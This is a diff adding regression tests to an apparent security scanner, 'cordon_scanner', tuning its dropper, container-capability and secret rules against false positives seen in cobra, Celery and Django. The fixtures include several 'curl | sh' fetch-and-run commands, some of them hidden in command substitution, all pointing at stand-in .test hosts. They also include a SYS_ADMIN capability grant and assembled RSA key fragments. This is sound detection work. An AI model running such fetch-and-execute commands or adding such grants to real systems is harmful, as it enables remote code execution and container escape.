@@ -562,3 +562,383 @@ class TestANameEndingInPathHoldsAPath:
         """
         aws_shaped = assemble("wJalrXUtnFEMI/K7MDENG/", "bPxRfiCY3XAMPL3K3Y").encode()
         assert NOT_A_SECRET.match(aws_shaped) is None
+
+
+class TestAPrintedCommandIsNotAnExecutedOne:
+    """`spf13/cobra` reported at CRITICAL, in the MALICIOUS category, for a
+    Makefile line that prints installation advice.
+
+        ifeq (, $(shell which golangci-lint))
+        $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
+        endif
+
+    That is the text shown to a developer who is missing a tool. Cordon read the
+    `curl ... | sh` inside it as a dropper and reported both MALWARE.DROPPER.001 and
+    SUSPECT.DROPPER.001 on the same line. An accusation of that weight against a
+    printed help message is not a tuning problem: it is the finding that ends the
+    conversation about adopting the tool, on one of the most depended-upon Go
+    libraries there is.
+
+    Install instructions inside diagnostics, READMEs and `echo` lines are
+    everywhere, because piping a script into a shell is how a great deal of
+    software documents its own installation.
+
+    Two conditions, and the second is what stops this becoming a hole: the
+    statement must be a printer, AND the match must lie entirely inside its quoted
+    argument.
+    """
+
+    @staticmethod
+    def suppressed(source: str) -> bool:
+        import re
+
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        raw = source.encode()
+        content = FileContent(path="Makefile", raw=raw, size=len(raw))
+        match = re.search(rb"curl", raw)
+        assert match is not None
+        return CapabilityDetector._is_printed_text(content, match.start(), match.end())
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            '$(warning "could not find golangci-lint, run: curl -sfL https://x.test/i | sh")\n',
+            '$(info "install with: curl https://x.test/i | bash")\n',
+            '\techo "To install: curl -sfL https://get.test/x | sh"\n',
+            '\t@echo "run: curl https://x.test/s | bash"\n',
+            'console.log("install with: curl https://x.test/i | sh")\n',
+            '\techo "couldn\'t find it, run: curl https://x.test/i | sh"\n',
+        ],
+    )
+    def test_a_printed_instruction_is_text(self, source: str) -> None:
+        assert self.suppressed(source)
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "curl -sfL https://x.test/i.sh | sh\n",
+            # Quoted is not inert. A shell runs `$(...)` and backticks inside DOUBLE
+            # quotes, so these really do fetch and execute -- the quotes are around
+            # the output, not around the command. Suppressing the egress here would
+            # have taken one half of the dropper composite away from a genuine
+            # fetch-and-run, which is the hole the quote test alone would have left.
+            '\techo "$(curl -s https://x.test/s)" | sh\n',
+            '\techo "`curl -s https://x.test/s`" | sh\n',
+            '$(warning "$(shell curl -s https://x.test/s)")\n',
+        ],
+    )
+    def test_a_real_fetch_is_not_suppressed(self, source: str) -> None:
+        assert not self.suppressed(source)
+
+    def test_single_quotes_stay_inert(self) -> None:
+        """Single quotes suppress substitution in every shell, so a `$(...)` inside
+        them is literal text and stays suppressed."""
+        assert self.suppressed("\techo 'literal $(curl https://x.test/s)'\n")
+
+    def test_the_cobra_makefile_end_to_end(self, tmp_path) -> None:
+        (tmp_path / "Makefile").write_text(
+            'BIN="./bin"\n'
+            "\n"
+            "ifeq (, $(shell which golangci-lint))\n"
+            '$(warning "could not find golangci-lint in $(PATH), run: '
+            'curl -sfL https://install.test/golangci-lint.sh | sh")\n'
+            "endif\n"
+            "\n"
+            "lint:\n"
+            "\tgolangci-lint run -v\n",
+            encoding="utf-8",
+        )
+        found = flagged(tmp_path)
+        assert "MALWARE.DROPPER.001" not in found
+        assert "SUSPECT.DROPPER.001" not in found
+
+    def test_a_real_dropper_in_a_makefile_still_fires(self, tmp_path) -> None:
+        """The guard. A fix that stopped the rule firing in Makefiles would pass
+        the test above."""
+        (tmp_path / "Makefile").write_text(
+            "setup:\n\tcurl -sfL https://install.test/payload.sh | sh\n",
+            encoding="utf-8",
+        )
+        assert {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"} & flagged(tmp_path)
+
+
+class TestACommentedOutSettingConfiguresNothing:
+    """Celery's Helm chart reported at HIGH as "container adds a capability that
+    escapes the sandbox", for this:
+
+        securityContext: {}
+          # capabilities:
+          #   drop:
+          #   - ALL
+
+    Two things wrong at once, and the comment is the lesser of them. `drop: ALL` is
+    the most hardened setting a container can have, and the rule had no `add`
+    requirement -- so it was telling projects their best practice was a sandbox
+    escape, commented out or not.
+
+    The rule already carried a note about a near miss of the same kind: an earlier
+    version matched the phrase "nothing to drop into at all" in a comment in this
+    project's own Dockerfile, and was anchored to work around it. That is a fix per
+    rule. Comments are a property of the file.
+    """
+
+    @staticmethod
+    def masked(raw: bytes) -> bytes:
+        from cordon_scanner.detect.config_files import ConfigDetector
+
+        return ConfigDetector._without_comments(raw)
+
+    def test_offsets_are_preserved(self) -> None:
+        """Blanked, not removed, so every span and line number a finding reports
+        still points where it pointed."""
+        raw = b"a: 1  # comment\nb: 2\n"
+        assert len(self.masked(raw)) == len(raw)
+        assert self.masked(raw).startswith(b"a: 1  ")
+
+    def test_a_hash_inside_quotes_is_not_a_comment(self) -> None:
+        """`password: "a#b"` is a password. Blanking from that `#` would hide real
+        content, and hiding content in a security scanner is a false negative."""
+        # Assembled: this file is scanned by the tool it tests, and a
+        # credential-shaped literal here is one the self-scan reports.
+        raw = f'password: "{assemble("aB3kQ9#mZ", "2xT7vL4")}"\n'.encode()
+        assert self.masked(raw) == raw
+
+    def test_the_hardened_setting_is_not_an_escape(self, tmp_path) -> None:
+        (tmp_path / "pod.yaml").write_text(
+            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
+            '      securityContext:\n        capabilities:\n          drop: ["ALL"]\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)
+
+    def test_a_commented_block_is_not_a_setting(self, tmp_path) -> None:
+        (tmp_path / "values.yaml").write_text(
+            "apiVersion: v2\nsecurityContext: {}\n"
+            "  # capabilities:\n  #   drop:\n  #   - ALL\n"
+            "  # readOnlyRootFilesystem: true\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)
+
+    def test_a_real_capability_grant_still_fires(self, tmp_path) -> None:
+        (tmp_path / "pod.yaml").write_text(
+            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
+            '      securityContext:\n        capabilities:\n          add: ["SYS_ADMIN"]\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)
+
+    def test_cap_add_stands_alone(self, tmp_path) -> None:
+        """`cap_add` and `CapAdd` already say `add` in the key."""
+        (tmp_path / "docker-compose.yml").write_text(
+            "apiVersion: ignored\nservices:\n  app:\n    cap_add:\n      - SYS_PTRACE\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)
+
+
+class TestOneCredentialIsOneFinding:
+    """Celery's test keypairs came back eight times at CRITICAL, and two of those
+    were the same key reported twice.
+
+    Deduplication inside each path is by the hash of the matched VALUE, and two
+    paths matching different slices of one credential do not share it: the provider
+    pattern matched the PEM header, and the assembled-literal path folded the Python
+    triple-quoted string around it. Different bytes, different hash, same key, and
+    nothing in the report to tell a reader that from two keys.
+
+    A post-filter rather than a guard in each path, because the duplication is
+    BETWEEN paths -- which is how the first attempt at this missed it entirely.
+    """
+
+    def test_one_finding_per_key(self, tmp_path) -> None:
+        from cordon_scanner.detect.secrets import SecretDetector
+
+        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
+        body = assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXeZL0gYowoK1ht2ZLCDU9vN5")
+        (tmp_path / "keys.py").write_text(
+            f'KEY1 = """{header}\n{body}\n{assemble("-----END RSA ", "PRIVATE KEY-----")}"""\n',
+            encoding="utf-8",
+        )
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
+        assert len(keys) == 1, [f.evidence.span for f in keys]
+        assert SecretDetector.version  # the detector that owns the post-filter
+
+    def test_two_keys_are_two_findings(self, tmp_path) -> None:
+        """The guard: collapsing by rule id alone would report one."""
+        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
+        (tmp_path / "keys.py").write_text(
+            f'KEY1 = """{header}\n{assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXe")}\n"""\n'
+            f'KEY2 = """{header}\n{assemble("MIICXQIBAAKBgQDdUwj1W6r", "S2R9OZDON5mk0BYfaM1it")}\n"""\n',
+            encoding="utf-8",
+        )
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
+        assert len(keys) == 2, [f.evidence.span for f in keys]
+
+
+class TestWhereProjectsActuallyKeepTestMaterial:
+    """Celery keeps eight RSA test keypairs under `t/unit/security/`, and every
+    `test`-shaped glob missed a directory called `t`.
+
+    Reported at CRITICAL, eight times, on a file whose own docstring opens "Keys and
+    certificates for tests" and names the script that generated them. That is the
+    shape that gets a secret scanner switched off: the project cannot act on it,
+    cannot delete the keys, and has nothing to do but suppress the rule.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "t/unit/security/__init__.py",
+            "t/integration/test_canvas.py",
+            "pkg/mocks/client.go",
+            "src/__mocks__/api.ts",
+            "internal/golden/output.json",
+            "spec/fixtures/key.pem",
+            "e2e/support/commands.js",
+            "samples/quickstart/config.yaml",
+        ],
+    )
+    def test_it_is_recognised(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        ["celery/app/base.py", "src/main.rs", "cmd/server/main.go", "lib/client.rb"],
+    )
+    def test_application_code_is_not(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert not is_test_material(path)
+
+
+class TestACredentialInDocumentationIsUsuallyAFormat:
+    """Celery's SQS page carries a broker URL whose access key is the alphabet in
+    order, and two lines below it the same URL written with
+    `aws_access_key_id:aws_secret_access_key` as the format. The first was reported
+    at HIGH.
+
+    Ceilinged rather than suppressed, and the distinction matters: a real key pasted
+    into a README leaks exactly as far as one in a settings file, and plenty have
+    been. It stays in the report, below the severity that fails a build, with a
+    caveat saying why.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "docs/getting-started/brokers/sqs.rst",
+            "README.md",
+            "CONTRIBUTING.md",
+            "doc/configuration.txt",
+            "notebooks/demo.ipynb",
+            "config/app.yaml.example",
+        ],
+    )
+    def test_it_is_recognised(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_documentation
+
+        assert is_documentation(path)
+
+    @pytest.mark.parametrize("path", ["src/settings.py", "app/config.ts", "main.go"])
+    def test_code_is_not(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_documentation
+
+        assert not is_documentation(path)
+
+    def test_a_key_in_a_readme_is_reported_below_blocking(self, tmp_path) -> None:
+        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        (tmp_path / "README.md").write_text(
+            f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
+        )
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+        from cordon_scanner.core.models import Severity
+
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        hits = [f for f in result.findings if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"]
+        assert hits, "a credential in documentation must still be reported"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+        assert all("documentation" in f.message for f in hits)
+
+
+class TestADoctestIsDocumentation:
+    """Django's template parser documents itself with a doctest line assigning a
+    filter expression to a local called `token`, and the assignment rule read the
+    filter expression as a credential assigned to it. A transcript is prose that
+    happens to be executable, and a value in one illustrates a format by
+    construction.
+    """
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            ">>> token = 'variable{0}default:\"Default value\"'",
+            "... token = 'variable{0}default:\"Default value\"'",
+            "$ export AUTH_TOKEN=" + assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
+            "In [3]: token = 'variable{0}default:\"Default value\"'",
+        ],
+    )
+    def test_a_transcript_line_is_an_example(self, tmp_path, line: str) -> None:
+        (tmp_path / "base.py").write_text(
+            f'"""\nSample::\n\n    {line.format("|")}\n"""\n', encoding="utf-8"
+        )
+        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)
+
+    def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
+        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
+        (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
+        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+
+
+class TestAWindowsEnvironmentReferenceIsNotAValue:
+    """Django's documentation extension builds `token = "%HOMEPATH%\\\\" + token[2:]`,
+    which the assembled-literal path folded into a value assigned to something
+    called `token` and reported at HIGH.
+
+    `%VAR%` says the value arrives from the environment exactly as plainly as `$VAR`
+    does, and the POSIX form was already here. Any build script that touches Windows
+    paths is full of it.
+    """
+
+    @pytest.mark.parametrize(
+        "value", [rb"%HOMEPATH%\\", rb"%USERPROFILE%/.config", rb"%APPDATA%\\cordon"]
+    )
+    def test_it_is_a_placeholder(self, value: bytes) -> None:
+        from cordon_scanner.detect.secrets import PLACEHOLDER
+
+        assert PLACEHOLDER.search(value)
+
+    def test_a_real_value_is_not(self) -> None:
+        from cordon_scanner.detect.secrets import PLACEHOLDER
+
+        assert not PLACEHOLDER.search(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())
+
+
+class TestAnUnderscoredNameIsStillAName:
+    """`INTERNAL_RESET_SESSION_TOKEN = "_password_reset_token"` at HIGH. The value is
+    a session key NAME, and the identifier alternative in `NOT_A_SECRET` required the
+    first character to be a letter -- so a leading underscore, which is how Python
+    spells "private", made an obvious identifier unrecognisable.
+    """
+
+    @pytest.mark.parametrize(
+        "value", [b"_password_reset_token", b"_auth_token_cache", b"_internal_secret_key"]
+    )
+    def test_it_is_not_a_credential(self, value: bytes) -> None:
+        assert NOT_A_SECRET.match(value)
+
+    def test_key_material_is_still_key_material(self) -> None:
+        assert NOT_A_SECRET.match(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None
